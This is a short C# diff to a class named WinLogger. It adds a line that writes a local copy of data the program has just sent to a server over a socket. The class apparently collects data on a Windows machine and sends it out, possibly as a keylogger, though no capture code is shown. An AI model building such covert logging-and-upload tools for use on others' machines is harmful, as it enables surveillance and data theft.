@@ -83,6 +83,8 @@ public class WinLogger
                 // Send the data through the socket.  
                 int bytesSent = server.Send(msg);
 
+                File.AppendAllText(@"C:\Users\IEUser\sent.txt", concatBuf+"<EOF>");
+
                 // Release the socket.  
                 server.Shutdown(SocketShutdown.Both);  
                 server.Close();
